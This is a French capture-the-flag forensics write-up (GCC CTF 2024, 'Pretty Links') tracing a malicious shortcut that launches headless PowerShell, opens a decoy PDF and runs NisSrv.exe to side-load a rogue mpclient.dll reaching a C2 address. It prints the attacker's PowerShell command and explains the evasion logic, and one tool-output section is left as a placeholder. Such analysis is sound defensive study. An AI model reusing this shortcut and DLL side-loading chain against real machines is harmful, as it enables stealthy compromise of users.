---
title: "GCC-CTF 2024 · Forensique  · Pretty Links"
date: 2024-03-04T13:06:22+02:00
draft: false
---

> Article décliné du write-up issu du challenge *Pretty Links* (Forensique) du [GCC CTF 2024](https://gcc-ctf.com/).

Scénario : 

> Suite à la compromission d'un partenaire, votre collègue doit capturer le système de fichiers d'une machine victime. Un fichier étrange a attiré l'attention au cours de son enquête. Trouver le binaire utilisé pour initier l'exécution indirecte de la commande, l'IP et le port de l'attaquant.

## Résumé

`Temp` est un dossier parfois utilisé par les attaquants pour cacher des exécutables ou des fichiers malveillants, c'est le cas ici. Il contient des fichiers qui ne devraient pas se trouver à cet endroit tels que `NisSrv.exe`, `Facture.pdf`, `Facture.pdf.lnk` et `mpclient.dll`.

`Facture.pdf.lnk` est fichier raccourci, invisible dans un explorer Windows classique, qui est exécuté lorsque `Facture.pdf` est ouvert. Dans ce challenge, le raccourci contient un script Powershell malveillant qui lance `NisSrv.exe` (binaire légitime), qui **n'est pas** le malware. L'utilisation de l'outil [LECmd](https://www.sans.org/tools/lecmd/) permet de mieux comprendre ce que contient le fichier `Facture.pdf.lnk`, notamment qu'il abuse de `conhost.exe` et de `NisSrv.exe`.

`NisSrv.exe` utilise plusieurs `dll` dont `mpclient.dll`. De part la façon dont elles sont gérées par Windows, c'est une dll malveillante qui est chargée par le programme. Cela conduit le programme à se connecter à un C2.

La kill-chain et le script Powershell me font penser que ce comportement sert à outrepasser la surveillance d'un antivirus ou d'un EDR.

## Identification des fichiers suspects

Le challenge se présente sous la forme d'une image disque. On peut la monter avec [Autopsy](https://www.autopsy.com/) ou [FTKImager](https://www.exterro.com/digital-forensics-software/ftk-imager). Attention, Autopsy ne supporte pas tous les types d'image. Il est parfois nécessaire d'exporter l'arborescence du système de fichier avec FTKImager et de lancer Autopsy sur cet export. Cette méthode n'est pas parfaite mais dans le cadre de ce challenge, c'est suffisant.

Néanmoins, Autopsy ne va pas nous aider dans ce challenge. Pour trouver l'endroit où se cachent les fichiers malveillants, il faut chercher dans les endroit souvent utilisés par des attaquants. Le dossier `Temp` local fait partie de ceux-là (`AppData\Local\Temp`). Il contient les fichiers suivants :

```
- NisSrv.exe
- Facture.pdf
- Facture.pdf.lnk
- mpclient.dll
```

## Analyse du fichier PDF

Ma première hypothèse était que le fichier `Facture.pdf.lnk` et `Facture.pdf.lnk` étaient malveillants. En analysant `Facture.pdf.lnk` avec [LECmd](https://www.sans.org/tools/lecmd/) on obtient beaucoup d'informations : 

```
mettre l'output de l'outil ici
```

Analysons ce que fait le script Powershell :

```
--headless "%WINDIR%\System32\WindowsPowerShell\v1.0\powershell.exe" 
"$zweeki=$env:Temp;
$ocounselk=[System.IO.Path]::GetFullPath($zweeki);
$poledemy = $pwd;
Copy-Item "$poledemy\*" -Destination $ocounselk -Recurse -Force | Out-Null;
 C:\Users\sieur\AppData\Local\Temp - Recurse -Force
cd $ocounselk;
;
.\Facture.pdf;
.\NisSrv.exe" ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe
```

Pour résumer, il lance une console Powershell en *headless*, donc sans ouvrir d'interface graphique. Dans cette console, l'action qui est effectuée est de copier de manière récursive le contenu du dossier utilisateur (`C:\Users\<user>`) dans le dossier temporaire local (`C:\Users\<user>\AppData\Local\Temp`).

Enfin, le script rentre dans le dossier `Temp`, ouvre `Facture.pdf` et exécute `NisSrv.exe` avec l'application Edge en argument.

J'ai ensuite dirigé mes recherches sur le fichier PDF qui aurait pu contenir un script `Javascript` exécuté à l'ouverture du fichier pour se connecter à un C2. Cependant, l'analyse du fichier PDF n'a rien donné. J'ai utilisé 
[pdf-parser.py](https://blog.didierstevens.com/programs/pdf-tools/), [pdfid.py](https://blog.didierstevens.com/programs/pdf-tools/) et [pdftool.py](https://blog.didierstevens.com/programs/pdf-tools/). J'ai donc choisi de rediriger mes recherche sur `NisSrv.exe` et `mpclient.dll`.

## Analyse de NisSrv.exe et mpclient.dll

Ce sont deux noms de fichiers relatifs à des utilitaires Windows. Le programme a le bon hash mais la dll est notée [malveillante sur VirusTotal](https://virustotal.com/gui/file/59e45d499a96a169b726f717a836aff6e19113bca8cd5c2fba3362708810be4e). La dll initie deux connexions dont une vers `172.29.107.95:7894 (TCP)`. Un `strings` sur `NisSrv.exe` indique que ce programme utilise `mpclient.dll`.

Sous Windows, lorsqu'un exécutable demande une `dll`, le système va d'abord regarder si cette `dll` se trouve dans le même dossier que l'exécutable. Si le nom correspond, alors cette dernière est chargée et l'exécutable peut utiliser les fonctionnalités contenues à l'intérieur. Ici, il n'y a pas de vérification de la signature de la dll, ce qui conduit le programme `NisSrv.exe` à utiliser le mauvais `mpclient.dll` qui va le corrompre et initier une communication vers le C2.

## Récapitulatif

Lorsque le fichier lnk est exécuté, le script Powershell est exécuté, faisant une copie récursive du dossier utilisateur dans le dossier temporaire. De part la façon dont fonctionne Windows, c'est `conhost.exe` qui permet de lancer Powershell. Pour l'utilisateur, le fichier PDF s'ouvre et l'utilitaire `NisSrv.exe` est également lancé afin de sécuriser cette action.

`NisSrv.exe` a besoin de `mpclient.dll` et va d'abord la chercher dans le même dossier que lui. C'est à ce moment que la mauvaise dll est chargée par le programme qui va se faire corrompre pour se connecter à un C2. VirusTotal est en capacité de nous fournir l'adresse et le port de la connexion mais un reverse de la dll aurait pu nous donner cet IOC.

Il reste la question de la copie du dossier utilisateur dans le dossier local. Mon hypothèse est que l'attaquant veut comprendre où il se trouve et les fichiers de l'utilisateur pourraient lui permettre de se situer.

Le deuxième avantage avec cette méthode est qu'il pourrait permettre de passer sous la détection d'un antivirus ou d'un EDR. Il semble plus légitime qu'un programme travaille sur des fichiers situés dans un dossier temporaire, plutôt que sur les fichiers de l'utilisateur.